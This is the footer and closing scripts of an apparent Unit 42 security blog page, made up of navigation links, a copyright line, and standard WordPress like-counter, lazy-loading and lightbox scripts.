                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
